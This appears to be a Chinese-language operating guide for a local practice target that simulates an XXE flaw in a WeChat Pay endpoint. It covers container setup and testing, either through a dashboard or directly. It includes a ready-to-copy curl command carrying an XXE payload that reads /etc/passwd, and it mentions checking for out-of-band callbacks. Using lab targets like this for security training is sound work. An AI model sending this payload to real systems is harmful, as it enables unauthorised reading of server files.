# wxpay-xxe 操作教程

- 类型：单体靶场
- 目录：`wxpay-xxe`
- 端口：`9974`
- 推荐入口：`/wxpay-xxe`

## 这是什么

微信支付 XXE 靶场

## 启动前准备

1. 在仓库根目录执行 `bash run-local-build.sh`。
2. 等待对应容器启动完成，并确认端口 `9974` 已经监听。
3. 如果你还想通过首页统一发包，再额外确认 `http://宿主机IP:5000/` 能打开。

## 方式一：通过首页测试

1. 打开 `http://宿主机IP:5000/`。
2. 在搜索框输入 `wxpay.xxe、wxpay_xxe、xxe_wxpay_attack` 过滤到当前项目。
3. 先点“测试”发送内置模板。
4. 推荐先跑 `xxe_wxpay_attack`，再按需用“重放数据包”替换 payload。

推荐直接使用的首页条目：
- `xxe_wxpay_attack`：POST http://宿主机IP:9974/wxpay-xxe

## 方式二：直接访问接口测试

1. 先访问推荐入口：`http://宿主机IP:9974/wxpay-xxe`。
2. 先执行攻击面请求：`xxe_wxpay_attack`。
3. 可直接复制命令：`curl -X POST "http://宿主机IP:9974/wxpay-xxe" -H "Content-Type: application/json" -d "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE xdsec [<!ELEMENT methodname ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><methodcall><methodname>&xxe;</methodname></methodcall>"`。

## 测试时重点看什么

1. 看接口是否返回成功，以及响应内容是否和正常请求不同。
2. 结合容器日志判断是否进入了目标解析、反序列化或模板处理逻辑。
3. 如果你接了 DNSLog、LDAP 或 RMI 观察点，也可以顺手对照外带痕迹。

## 相关入口

- 总控台：`http://宿主机IP:5000/`
- 文档索引：[`doc/README.md`](../README.md)
- 根项目说明：[`README.md`](../../README.md)
